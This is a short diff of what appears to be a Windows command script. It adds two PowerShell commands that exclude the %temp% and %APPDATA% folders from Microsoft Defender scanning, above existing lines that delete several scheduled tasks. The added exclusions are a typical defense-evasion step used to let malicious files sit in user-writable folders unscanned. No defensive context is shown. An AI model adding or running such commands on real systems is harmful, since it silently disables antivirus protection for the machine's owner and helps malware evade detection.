@@ -1,3 +1,5 @@
+powershell -c Add-MpPreference -ExclusionPath "%temp%"
+powershell -c Add-MpPreference -ExclusionPath "%APPDATA%"
 schtasks /delete /tn "auto_by_task" /f
 schtasks /delete /tn "InstallRequests" /f
 schtasks /delete /tn "RunPowerShellScript" /f
